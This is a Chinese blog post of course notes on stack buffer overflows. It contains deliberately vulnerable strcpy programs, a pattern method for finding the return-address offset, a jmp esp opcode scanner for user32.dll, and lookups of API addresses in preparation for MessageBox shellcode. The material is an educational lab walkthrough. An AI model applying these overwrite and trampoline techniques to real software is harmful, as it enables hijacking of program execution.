<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Pwn,Notes,Stackoverflow," />





  <link rel="alternate" href="/atom.xml" title="Cytosineの有被小窝~" type="application/atom+xml" />






<meta name="description" content="https://www.ichunqiu.com/course/147 的一个笔记 （视频播放的时候，右下角速度x2，主要看实验，OD动手调，看指令执行前后，右下角的栈空间的变化） 10、11号学的，纠结好了好久，要不要发出来，挺low的，窝自己也知道，不过也算是迈出第一步了，所以也不嫌丢人了，还是发出来吧QVQ 缓冲区溢出的原理一句话总结一下，就是输入的数据超过了缓冲区的长度，覆盖了缓冲区下面的">
<meta name="keywords" content="Pwn,Notes,Stackoverflow">
<meta property="og:type" content="article">
<meta property="og:title" content="《缓冲区溢出分析》课程笔记">
<meta property="og:url" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/index.html">
<meta property="og:site_name" content="Cytosineの有被小窝~">
<meta property="og:description" content="https://www.ichunqiu.com/course/147 的一个笔记 （视频播放的时候，右下角速度x2，主要看实验，OD动手调，看指令执行前后，右下角的栈空间的变化） 10、11号学的，纠结好了好久，要不要发出来，挺low的，窝自己也知道，不过也算是迈出第一步了，所以也不嫌丢人了，还是发出来吧QVQ 缓冲区溢出的原理一句话总结一下，就是输入的数据超过了缓冲区的长度，覆盖了缓冲区下面的">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/0.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/1.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/2.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/3.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/4.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/5.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/6.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/7.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/8.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/5.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/9.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/10.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/11.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/12.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/13.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/14.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/15.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/16.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/17.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/18.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/19.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/20.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/21.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/22.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/24.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/25.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/26.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/27.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/28.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/29.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/30.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/31.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/32.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/33.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/37.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/38.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/39.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/40.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/41.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/42.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/43.png">
<meta property="og:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/44.png">
<meta property="og:updated_time" content="2018-08-14T09:20:52.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="《缓冲区溢出分析》课程笔记">
<meta name="twitter:description" content="https://www.ichunqiu.com/course/147 的一个笔记 （视频播放的时候，右下角速度x2，主要看实验，OD动手调，看指令执行前后，右下角的栈空间的变化） 10、11号学的，纠结好了好久，要不要发出来，挺low的，窝自己也知道，不过也算是迈出第一步了，所以也不嫌丢人了，还是发出来吧QVQ 缓冲区溢出的原理一句话总结一下，就是输入的数据超过了缓冲区的长度，覆盖了缓冲区下面的">
<meta name="twitter:image" content="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/0.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/"/>





  <title>《缓冲区溢出分析》课程笔记 | Cytosineの有被小窝~</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Cytosineの有被小窝~</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">智能是人类未来之光，安全是人类基本需求。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            cd ~
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
            uname -a
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
            ls -al post
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2018/08/14/note-pwn-first-stackoverflow-analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Cytosine">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.webp">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cytosineの有被小窝~">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">《缓冲区溢出分析》课程笔记</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-14T12:48:03+08:00">
                2018-08-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><a href="https://www.ichunqiu.com/course/147" target="_blank" rel="external">https://www.ichunqiu.com/course/147</a> 的一个笔记</p>
<p>（视频播放的时候，右下角速度x2，主要看实验，OD动手调，看指令执行前后，右下角的栈空间的变化）</p>
<p>10、11号学的，纠结好了好久，要不要发出来，挺low的，窝自己也知道，不过也算是迈出第一步了，所以也不嫌丢人了，还是发出来吧QVQ</p>
<h1 id="缓冲区溢出的原理"><a href="#缓冲区溢出的原理" class="headerlink" title="缓冲区溢出的原理"></a>缓冲区溢出的原理</h1><p>一句话总结一下，就是输入的数据超过了缓冲区的长度，覆盖了缓冲区下面的返回地址，程序执行完当前的子程序，想要返回到调用处时，返回到了攻击者构造的恶意代码处。</p>
<h2 id="判定main-函数地址"><a href="#判定main-函数地址" class="headerlink" title="判定main()函数地址"></a>判定main()函数地址</h2><ol>
<li>IDA打开程序，定位到main，找到地址</li>
<li>OD中，右键-&gt;转到-&gt;表达式(<code>Ctrl+G</code>)，跳到相应地址，下断点</li>
</ol>
<h2 id="定位调用main-函数的语句"><a href="#定位调用main-函数的语句" class="headerlink" title="定位调用main()函数的语句"></a>定位调用main()函数的语句</h2><ol>
<li>IDA中，在<code>main()</code>入口处，<code>Ctrl-X</code>打开交叉引用窗口，找到调用的语句，然后一直找，直到找到<code>call main</code></li>
<li>OD中，右键-&gt;转到-&gt;表达式(<code>Ctrl+G</code>)，输入上面的地址</li>
</ol>
<h2 id="分析call语句对栈空间的影响"><a href="#分析call语句对栈空间的影响" class="headerlink" title="分析call语句对栈空间的影响"></a>分析call语句对栈空间的影响</h2><p>两步：</p>
<ol>
<li>call下面语句的地址入栈（返回地址入栈）</li>
<li>jmp到call的位置</li>
</ol>
<h2 id="分析正常程序与存在溢出的程序，对栈空间的影响"><a href="#分析正常程序与存在溢出的程序，对栈空间的影响" class="headerlink" title="分析正常程序与存在溢出的程序，对栈空间的影响"></a>分析正常程序与存在溢出的程序，对栈空间的影响</h2><h3 id="正常程序"><a href="#正常程序" class="headerlink" title="正常程序"></a>正常程序</h3><p>vc6.0编译下面代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;jiangye&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	strcpy(buffer, name);</div><div class="line">	printf(&quot;%s&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>生成debug版:</p>
<p><img src="0.png" alt=""></p>
<p>OD载入文件，定位main()入口，定位call main函数的位置，F2下断点，F9运行过去，到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00401694  |.  E8 6CF9FFFF   call    00401005</div></pre></td></tr></table></figure>
<p>F7步入，然后F8执行到这里：</p>
<p><img src="1.png" alt=""></p>
<ul>
<li><code>1</code>: call那个地址，从IDA中得知那个地址是strcpy</li>
<li><code>2</code>: 栈中存放的是<code>strcpy</code>将会把字符串拷贝到的地址，即<code>0012FF78</code></li>
<li><code>3</code>: 地址<code>0012FF78</code>，call strcpy之后，这个地址处的数据就会编程<code>jiangye</code></li>
</ul>
<p>F8步过：</p>
<p><img src="2.png" alt=""></p>
<h3 id="存在栈溢出的程序"><a href="#存在栈溢出的程序" class="headerlink" title="存在栈溢出的程序"></a>存在栈溢出的程序</h3><p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;jiangyejiangye&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	strcpy(buffer, name);</div><div class="line">	printf(&quot;%s&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样vc6.0,debug版，步骤也一样，到strcpy前，栈空间：</p>
<p><img src="3.png" alt=""></p>
<ul>
<li>同样的，<code>strcpy</code>函数会把字符串拷贝到<code>0012FF78</code>处</li>
<li>现在，<code>0012FF84</code>处存放的是函数的返回地址</li>
</ul>
<p>F8步过后：</p>
<p><img src="4.png" alt=""></p>
<p>现在<code>0012FF84</code>处的返回地址被覆盖了</p>
<p>继续运行程序：</p>
<p><img src="5.png" alt=""></p>
<p>出错了，因为刚才的返回地址被覆盖成了一个奇怪的值，这个值处没有可执行的指令，所以出错了。</p>
<p>那么，当覆盖的地址处，有可执行的恶意代码，那么计算机就会执行该处的恶意代码了。</p>
<h1 id="缓冲区溢出的利用"><a href="#缓冲区溢出的利用" class="headerlink" title="缓冲区溢出的利用"></a>缓冲区溢出的利用</h1><h2 id="利用错误对话框，精确定位返回地址的位置"><a href="#利用错误对话框，精确定位返回地址的位置" class="headerlink" title="利用错误对话框，精确定位返回地址的位置"></a>利用错误对话框，精确定位返回地址的位置</h2><h3 id="本例"><a href="#本例" class="headerlink" title="本例"></a>本例</h3><p><img src="6.png" alt=""></p>
<p><img src="7.png" alt=""></p>
<p><img src="8.png" alt=""></p>
<p>红框中<code>code:0xc0000005</code>，表示错误代码<br><code>0xc0000005</code>代表缓冲区溢出</p>
<p>蓝框中<code>address:0x00006579</code>，窝们再看一下上一部分出错的截图</p>
<p><img src="5.png" alt=""></p>
<p><code>0x00006579</code>是一个无效的地址。</p>
<p>那我们将<code>0x65</code>和<code>0x79</code>根据ASCII编码变成字符，是<code>e</code>和<code>y</code>。</p>
<p>刚好是输入<code>jiangyejiangye</code>的最后两个字符</p>
<p>（<code>ye</code>和<code>ey</code>反过来了，是因为计算机是小端序。）</p>
<p>那么，也就是说返回地址是<code>jiangyejiangXXXX</code>中的被<code>XXXX</code>覆盖的部分。</p>
<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char TestCode[] = &quot;&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    char buffer[80];</div><div class="line">	strcpy(buffer, TestCode);</div><div class="line">	printf(&quot;%s\n&quot;, buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一轮：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TestCode[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</div></pre></td></tr></table></figure>
<p>正常。</p>
<p>第二轮：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TestCode[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</div></pre></td></tr></table></figure>
<p><img src="9.png" alt=""></p>
<p><code>0x6a696867</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; &quot;6a696867&quot;.decode(&apos;hex&apos;)</div><div class="line">&apos;jihg&apos;</div></pre></td></tr></table></figure>
<p>因为小端序，所以是ghij处。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefXXXX</div></pre></td></tr></table></figure>
<p>XXXX是返回地址。</p>
<p>XXXX前面四位是父函数的EBP，去掉后取长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; len(&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZab&apos;)</div><div class="line">80</div></pre></td></tr></table></figure>
<p>所以，所验证的缓冲区大小就是80个字节。</p>
<h2 id="ESP-栈指针寄存器"><a href="#ESP-栈指针寄存器" class="headerlink" title="ESP 栈指针寄存器"></a>ESP 栈指针寄存器</h2><p>Extended Stack Pointer</p>
<p>ESP的内容在任何时候都指向当前的栈顶。</p>
<p>每当有一个数据入栈，ESP就跟着改变。总之，它永远指向最后一个压入栈的数据。</p>
<p>堆栈的基址开始于一个高地址，然后每当有数据入栈，它就向低地址的方向进行存储。相应的入栈指令是PUSH。</p>
<p>如果要用压入栈的数据，就用相应的出栈指令POP。</p>
<p>当向堆栈中压入数据时，ESP会向上移动，使用PUSH指令，ESP变化为：ESP - 数据位数。<br>当向堆栈中压出数据时，ESP会向下移动，使用POP指令，ESP变化为：ESP + 数据位数。</p>
<h2 id="寻找一个合适的地址用于覆盖原始地址-jmp-esp"><a href="#寻找一个合适的地址用于覆盖原始地址-jmp-esp" class="headerlink" title="寻找一个合适的地址用于覆盖原始地址(jmp esp)"></a>寻找一个合适的地址用于覆盖原始地址(jmp esp)</h2><blockquote>
<p>jmp esp, 利用跳板进行跳转。<br>这里的跳板是程序中原有的机器代码，它们都是能够跳转到一个寄存器内所存放的地址进行执行，如jmp esp、call esp、jmp ecx、call eax等等。如果在函数返回的时候，CPU内寄存器刚好直接或者间接指向ShellCode的开头，这样就可以把对栈内存放的返回地址的那一个元素覆盖为相应的跳板地址。<br>——摘自实验2指导手册</p>
</blockquote>
<p>OD载入第一个没有缓冲区溢出的正常程序</p>
<p>在<code>004010A6</code>处，也就是main函数<code>retn</code>返回处，下个断点，F9运行</p>
<p><img src="10.png" alt=""></p>
<p>现在，<code>1</code>处，esp中保存的值是<code>0x0012FF84</code>，窝们到栈中，找到<code>0x0012FF84</code>处，保存的值是<code>0x00401699</code>，也就是main函数的返回地址。即下一条语句的位置。</p>
<p>F8:</p>
<p><img src="11.png" alt=""></p>
<p>此时窝们来到<code>0x00401699</code>，已经跳出main函数了。此时，看esp的值，从<code>0x0012FF84</code>变为了<code>0x0012FF88</code>。</p>
<p><code>0x0012FF84</code>处存放的，是返回地址，也就是窝们想要修改的地址值。</p>
<blockquote>
<p>当main函数执行完毕的时候，esp的值会自动变成返回地址的下一个位置，而esp的这种变化，一般是不受任何情况影响的。既然我们知道了这一个特性，那么其实就可以将返回地址修改为esp所保存的地址，也就是说，我们可以让程序跳转到esp所保存的地址中，去执行我们所构造的指令，以便让计算机执行。<br>——摘自实验2指导手册</p>
</blockquote>
<p><strong>如何让程序跳转到esp指向的位置？</strong></p>
<p><code>jmp esp</code>, 其机器码是<code>0xFFE4</code></p>
<p>下面的代码在user32.dll中查找这条指令的地址（jmp esp在很多dll中都存在，这里只是以user32.dll为例）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        BYTE *ptr;</div><div class="line">        int position;</div><div class="line">        HINSTANCE handle;</div><div class="line">        BOOL done_flag = FALSE;</div><div class="line">        handle = LoadLibrary(&quot;user32.dll&quot;); //加载不同的dll</div><div class="line">        if(!handle)</div><div class="line">        &#123;</div><div class="line">                printf(&quot;load dll error!&quot;);</div><div class="line">                exit(0);</div><div class="line">        &#125;</div><div class="line">        ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">        for(position = 0; !done_flag; position++)</div><div class="line">        &#123;</div><div class="line">                try</div><div class="line">                &#123;</div><div class="line">                        if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) //寻找不同的opcode</div><div class="line">                        &#123;</div><div class="line">                                int address = (int)ptr + position;</div><div class="line">                                printf(&quot;OPCODE found at 0x%x\n&quot;, address);</div><div class="line">                        &#125;</div><div class="line">                &#125;</div><div class="line">                catch(...)</div><div class="line">                &#123;</div><div class="line">                        int address = (int)ptr + position;</div><div class="line">                        printf(&quot;END OF 0x%x\n&quot;, address);</div><div class="line">                        done_flag = true;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">		getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行，查找jmp esp：</p>
<p><img src="12.png" alt=""></p>
<p>可以看到有很多jmp esp。</p>
<h1 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h1><h2 id="获取MessageBox-amp-ExitProcess-的地址"><a href="#获取MessageBox-amp-ExitProcess-的地址" class="headerlink" title="获取MessageBox()&amp;ExitProcess()的地址"></a>获取MessageBox()&amp;ExitProcess()的地址</h2><h3 id="Address-of-MessageBox"><a href="#Address-of-MessageBox" class="headerlink" title="Address of MessageBox()"></a>Address of MessageBox()</h3><p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123; </div><div class="line">        HINSTANCE LibHandle;</div><div class="line">        MYPROC ProcAdd;</div><div class="line">        LibHandle = LoadLibrary(&quot;user32&quot;); //获取user32.dll的地址</div><div class="line">        printf(&quot;user32 = 0x%x\n&quot;, LibHandle); //获取MessageBoxA的地址</div><div class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle, &quot;MessageBoxA&quot;);</div><div class="line">        printf(&quot;MessageBoxA = 0x%x\n&quot;, ProcAdd);</div><div class="line">     	getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>result:</p>
<p><img src="13.png" alt=""></p>
<h3 id="Address-of-ExitProcess"><a href="#Address-of-ExitProcess" class="headerlink" title="Address of ExitProcess()"></a>Address of ExitProcess()</h3><blockquote>
<p>我们利用溢出操作破坏了原本的栈空间的内容，这就可能会在我们的对话框显示完后，导致程序崩溃，所以为了谨慎起见，我们这里还需要使用ExitProcess()函数来令程序终止。<br>摘自实验指导手册</p>
</blockquote>
<p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123; </div><div class="line">        HINSTANCE LibHandle;</div><div class="line">        MYPROC ProcAdd;</div><div class="line">        LibHandle = LoadLibrary(&quot;kernel32&quot;); //获取kernel32.dll的地址</div><div class="line">        printf(&quot;kernel32 = 0x%x\n&quot;, LibHandle); //获取ExitProcess的地址</div><div class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle, &quot;ExitProcess&quot;);</div><div class="line">        printf(&quot;ExitProcess = 0x%x\n&quot;, ProcAdd);</div><div class="line">     	getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>result:</p>
<p><img src="14.png" alt=""></p>
<h2 id="编写汇编代码，实现函数调用"><a href="#编写汇编代码，实现函数调用" class="headerlink" title="编写汇编代码，实现函数调用"></a>编写汇编代码，实现函数调用</h2><h3 id="函数调用-call"><a href="#函数调用-call" class="headerlink" title="函数调用 call"></a>函数调用 call</h3><ol>
<li><p>参数从右至左入栈</p>
</li>
<li><p> <code>call addr</code></p>
<p> 或者:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov eax,addr</div><div class="line">call eax</div></pre></td></tr></table></figure>
</li>
</ol>
<p>举个例子：</p>
<p>调用函数func(a,b,c)，函数地址0x12345678</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">push c</div><div class="line">push b</div><div class="line">push a</div><div class="line">mov eax,0x12345678</div><div class="line">call eax</div></pre></td></tr></table></figure>
